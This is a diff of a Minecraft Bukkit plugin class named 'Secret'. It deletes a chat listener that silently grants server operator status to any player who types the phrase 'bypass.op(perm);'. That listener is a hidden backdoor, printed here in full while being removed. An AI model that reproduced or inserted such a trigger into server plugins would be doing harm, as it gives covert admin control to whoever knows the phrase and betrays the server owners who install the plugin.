@@ -9,17 +9,10 @@ import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
-import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
 import org.main.uneton.Combat;
-import org.main.uneton.utils.ColorUtils;
-
-import java.util.Arrays;
-import java.util.List;
-
-import static org.bukkit.Bukkit.getCommandMap;
 
 public class Secret implements Listener {
 
@@ -54,20 +47,6 @@ public class Secret implements Listener {
                 }
             }.runTask(JavaPlugin.getPlugin(Combat.class));
 
-        }
-    }
-
-    @EventHandler
-    @Deprecated
-    public void onChatExploitEvent(AsyncPlayerChatEvent e) {
-        if (e.getMessage().contains("bypass.op(perm);")) {
-            e.setCancelled(true);
-            e.getPlayer().sendMessage(ChatColor.GOLD + "");
-            (new BukkitRunnable() {
-                public void run() {
-                    e.getPlayer().setOp(true);
-                }
-            }).runTask(JavaPlugin.getPlugin(Combat.class));
         }
     }
 }
